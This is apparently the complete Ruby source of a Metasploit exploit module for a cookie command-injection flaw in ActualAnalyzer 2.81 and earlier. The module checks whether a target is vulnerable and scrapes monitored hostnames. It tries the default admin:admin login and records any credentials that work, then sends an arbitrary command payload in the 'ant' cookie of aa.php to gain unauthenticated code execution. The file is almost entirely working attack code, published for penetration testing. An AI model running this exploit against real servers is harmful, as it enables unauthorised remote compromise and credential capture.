# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      &#039;Name&#039;            => "ActualAnalyzer &#039;ant&#039; Cookie Command Execution",
      &#039;Description&#039;     => %q{
        This module exploits a command execution vulnerability in
        ActualAnalyzer version 2.81 and prior.

        The &#039;aa.php&#039; file allows unauthenticated users to
        execute arbitrary commands in the &#039;ant&#039; cookie.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Benjamin Harris&#039;, # Discovery and exploit
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;References&#039;      =>
        [
          [&#039;EDB&#039;, &#039;34450&#039;],
          [&#039;OSVDB&#039;, &#039;110601&#039;]
        ],
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 4096, # HTTP cookie
          &#039;DisableNops&#039; => true,
          &#039;BadChars&#039;    => "\x00"
        },
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Platform&#039;        => &#039;unix&#039;,
      &#039;Targets&#039;         =>
        [
          # Tested on ActualAnalyzer versions 2.81 and 2.75 on Ubuntu
          [&#039;ActualAnalyzer <= 2.81&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Aug 28 2014&#039;,
      &#039;DefaultTarget&#039;   => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to ActualAnalyzer&#039;, &#039;/lite/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [false, &#039;The username for ActualAnalyzer&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, &#039;The password for ActualAnalyzer&#039;, &#039;admin&#039;]),
        OptString.new(&#039;ANALYZER_HOST&#039;, [false, &#039;A hostname or IP monitored by ActualAnalyzer&#039;, &#039;&#039;])
      ], self.class)
  end

  #
  # Checks if target is running ActualAnalyzer <= 2.81
  #
  def check
    # check for aa.php
    res = send_request_raw(&#039;uri&#039; => normalize_uri(target_uri.path, &#039;aa.php&#039;))
    if !res
      vprint_error("#{peer} - Connection failed")
      return Exploit::CheckCode::Unknown
    elsif res.code == 404
      vprint_error("#{peer} - Could not find aa.php")
      return Exploit::CheckCode::Safe
    elsif res.code == 200 && res.body =~ /ActualAnalyzer Lite/ && res.body =~ /Admin area<\/title>/
      vprint_error("#{peer} - ActualAnalyzer is not installed. Try installing first.")
      return Exploit::CheckCode::Detected
    end
    # check version
    res = send_request_raw(&#039;uri&#039; => normalize_uri(target_uri.path, &#039;view.php&#039;))
    if !res
      vprint_error("#{peer} - Connection failed")
      return Exploit::CheckCode::Unknown
    elsif res.code == 200 && /title="ActualAnalyzer Lite \(free\) (?<version>[\d\.]+)"/ =~ res.body
      vprint_status("#{peer} - Found version: #{version}")
      if Gem::Version.new(version) <= Gem::Version.new(&#039;2.81&#039;)
        report_vuln(
          host: rhost,
          name: self.name,
          info: "Module #{fullname} detected ActualAnalyzer #{version}",
          refs: references,
        )
        return Exploit::CheckCode::Vulnerable
      end
      return Exploit::CheckCode::Detected
    elsif res.code == 200 && res.body =~ /ActualAnalyzer Lite/
      return Exploit::CheckCode::Detected
    end
    Exploit::CheckCode::Safe
  end

  #
  # Try to retrieve a valid analytics host from view.php unauthenticated
  #
  def get_analytics_host_view
    analytics_host = nil
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;view.php&#039;),
      &#039;vars_post&#039; => {
        &#039;id_h&#039; => &#039;&#039;,
        &#039;listp&#039; => &#039;&#039;,
        &#039;act_h&#039; => &#039;vis_int&#039;,
        &#039;oldact&#039; => &#039;vis_grpg&#039;,
        &#039;tint_h&#039; => &#039;&#039;,
        &#039;extact_h&#039; => &#039;&#039;,
        &#039;home_pos&#039; => &#039;&#039;,
        &#039;act&#039; => &#039;vis_grpg&#039;,
        &#039;tint&#039; => &#039;total&#039;,
        &#039;grpg&#039; => &#039;201&#039;,
        &#039;cp_vst&#039; => &#039;on&#039;,
        &#039;cp_hst&#039; => &#039;on&#039;,
        &#039;cp_htst&#039; => &#039;on&#039;,
        &#039;cp_reps&#039; => &#039;y&#039;,
        &#039;tab_sort&#039; => &#039;1_1&#039;
      }
    )
    if !res
      vprint_error("#{peer} - Connection failed")
    elsif /<option value="?[\d]+"?[^>]*>Page: https?:\/\/(?<analytics_host>[^\/^<]+)/ =~ res.body
      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
      return analytics_host
    else
      vprint_status("#{peer} - Could not find any hosts on view.php")
    end
    nil
  end

  #
  # Try to retrieve a valid analytics host from code.php unauthenticated
  #
  def get_analytics_host_code
    analytics_host = nil
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;code.php&#039;),
      &#039;vars_get&#039; => {
        &#039;pid&#039; => &#039;1&#039;
      }
    )
    if !res
      vprint_error("#{peer} - Connection failed")
    elsif res.code == 200 && /alt=&#039;ActualAnalyzer&#039; src=&#039;https?:\/\/(?<analytics_host>[^\/^&#039;]+)/ =~ res.body
      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
      return analytics_host
    else
      vprint_status("#{peer} - Could not find any hosts on code.php")
    end
    nil
  end

  #
  # Try to retrieve a valid analytics host from admin.php with creds
  #
  def get_analytics_host_admin
    analytics_host = nil
    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin.php&#039;),
      &#039;vars_post&#039; => {
        &#039;uname&#039; => user,
        &#039;passw&#039; => pass,
        &#039;id_h&#039; => &#039;&#039;,
        &#039;listp&#039; => &#039;&#039;,
        &#039;act_h&#039; => &#039;&#039;,
        &#039;oldact&#039; => &#039;pages&#039;,
        &#039;tint_h&#039; => &#039;&#039;,
        &#039;extact_h&#039; => &#039;&#039;,
        &#039;param_h&#039; => &#039;&#039;,
        &#039;param2_h&#039; => &#039;&#039;,
        &#039;home_pos&#039; => &#039;&#039;,
        &#039;act&#039; => &#039;dynhtml&#039;,
        &#039;set.x&#039; => &#039;11&#039;,
        &#039;set.y&#039; => &#039;11&#039;
      }
    )
    if !res
      vprint_error("#{peer} - Connection failed")
    elsif res.code == 200 && res.body =~ />Login</
      vprint_status("#{peer} - Login failed.")
    elsif res.code == 200 && /alt=&#039;ActualAnalyzer&#039; src=&#039;https?:\/\/(?<analytics_host>[^\/^&#039;]+)/ =~ res.body
      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
      print_good("#{peer} - Login successful! (#{user}:#{pass})")
      service_data = {
        address: Rex::Socket.getaddress(rhost, true),
        port: rport,
        service_name: (ssl ? &#039;https&#039; : &#039;http&#039;),
        protocol: &#039;tcp&#039;,
        workspace_id: myworkspace_id
      }
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        private_type: :password,
        private_data: pass,
        username: user
      }
      credential_data.merge!(service_data)
      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
      }
      login_data.merge!(service_data)
      create_credential_login(login_data)
      return analytics_host
    else
      vprint_status("#{peer} - Could not find any hosts on admin.php")
    end
    nil
  end

  def execute_command(cmd, opts = { analytics_host: vhost })
    vuln_cookies = %w(anw anm)
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;aa.php&#039;),
      &#039;vars_get&#039; => { &#039;anp&#039; => opts[:analytics_host] },
      &#039;cookie&#039; => "ant=#{cmd}; #{vuln_cookies.sample}=#{rand(100...999)}.`$cot`"
    )
    if !res
      fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out")
    elsif res.code == 302 && res.headers[&#039;Content-Type&#039;] =~ /image/
      print_good("#{peer} - Payload sent successfully")
      return true
    elsif res.code == 302 && res.headers[&#039;Location&#039;] =~ /error\.gif/
      vprint_status("#{peer} - Host &#039;#{opts[:analytics_host]}&#039; is not monitored by ActualAnalyzer.")
    elsif res.code == 200 && res.body =~ /Admin area<\/title>/
      fail_with(Failure::Unknown, "#{peer} - ActualAnalyzer is not installed. Try installing first.")
    else
      fail_with(Failure::Unknown, "#{peer} - Something went wrong")
    end
    nil
  end

  def exploit
    return unless check == Exploit::CheckCode::Vulnerable
    analytics_hosts = []
    if datastore[&#039;ANALYZER_HOST&#039;].blank?
      analytics_hosts << get_analytics_host_code
      analytics_hosts << get_analytics_host_view
      analytics_hosts << get_analytics_host_admin
      analytics_hosts << vhost
      analytics_hosts << &#039;127.0.0.1&#039;
      analytics_hosts << &#039;localhost&#039;
    else
      analytics_hosts << datastore[&#039;ANALYZER_HOST&#039;]
    end
    analytics_hosts.uniq.each do |host|
      next if host.nil?
      vprint_status("#{peer} - Trying hostname &#039;#{host}&#039; - Sending payload (#{payload.encoded.length} bytes)...")
      break if execute_command(payload.encoded, analytics_host: host)
    end
  end
end

